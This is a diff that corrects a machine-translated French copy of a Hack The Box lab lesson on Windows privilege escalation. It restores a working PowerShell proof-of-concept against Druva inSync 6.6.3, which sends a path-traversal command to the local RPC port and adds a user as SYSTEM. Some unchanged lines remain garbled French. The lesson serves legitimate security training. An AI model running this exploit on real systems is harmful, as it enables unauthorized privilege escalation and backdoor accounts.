@@ -14,18 +14,18 @@ Comme indiqué précédemment, commençons par énumérer les applications insta
 Énumération des programmes installés
 
 ```
-C:\htb> nom d'obtention du produit wmic
+C:\htb> wmic product get name
 
-Nom
-Microsoft Visual C++ 2019 X64 Durée d'exécution minimale - 14.28.29910
-Mise à jour pour Windows 10 pour les systèmes x64 (KB4023057)
-Exécution supplémentaire Microsoft Visual C++ 2019 X86 - 14.24.28127
-Outils VMware
+Name
+Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
+Update for Windows 10 for x64-based Systems (KB4023057)
+Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
+VMware Tools
 Druva inSync 6.6.3
-Outils de santé Microsoft Update
-Exécution supplémentaire Microsoft Visual C++ 2019 X64 - 14.28.29910
-Mise à jour pour Windows 10 pour les systèmes x64 (KB4480730)
-Microsoft Visual C++ 2019 X86 Durée d'exécution minimale - 14.24.28127
+Microsoft Update Health Tools
+Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910
+Update for Windows 10 for x64-based Systems (KB4480730)
+Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
 
 ```
 
@@ -55,7 +55,7 @@ Ensuite, mappons l'ID de processus (PID) `3324` au processus en cours d'exécu
 ID de processus d'énumération
 
 ```
-PS C:\htb> get-process -ID 3324
+PS C:\htb> get-process -Id 3324
 
 Gère NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName
 ------- ------ ----- ----- ------ -- -- -----------
@@ -72,9 +72,9 @@ Gère NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName
 ```
 PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}
 
-Nom d'état DisplayName
------- ---- -----------
-Exécution d'inSyncCPHService Service client Druva inSync
+Status   Name               DisplayName
+------   ----               -----------
+Running  inSyncCPHService   Druva inSync Client Service
 
 ```
 
@@ -90,26 +90,26 @@ Avec ces informations en main, essayons l'exploit PoC, qui est ce court extrait 
 Code : PowerShell
 
 ```
-$ErrorActionPreference = "Arrêter"
+$ErrorActionPreference = "Stop"
 
-$cmd = "utilisateur net pwnd /add"
+$cmd = "net user pwnd /add"
 
-$s = Nouvel objet System.Net.Sockets.Socket(
-     [System.Net.Sockets.AddressFamily] :: InterNetwork,
-     [System.Net.Sockets.SocketType] :: Flux,
-     [System.Net.Sockets.ProtocolType] :: Tcp
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
 )
 $s.Connect("127.0.0.1", 6064)
 
 $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
-$rpcType = [System.Text.Encoding] ::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
 $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
-$length = [System.BitConverter] ::GetBytes($command.Length);
+$length = [System.BitConverter]::GetBytes($command.Length);
 
 $s.Send($header)
 $s.Send($rpcType)
-$s.Envoyer($longueur)
-$s.Envoyer($commande)
+$s.Send($length)
+$s.Send($command)
 
 ```
 
@@ -162,7 +162,7 @@ PS C:\WINDOWS\system32>whoami
 
 autorité nt\système
 
-PS C:\WINDOWS\system32> nom d'hôte
+PS C:\WINDOWS\system32> hostname
 
 WINLPE-WS01
 
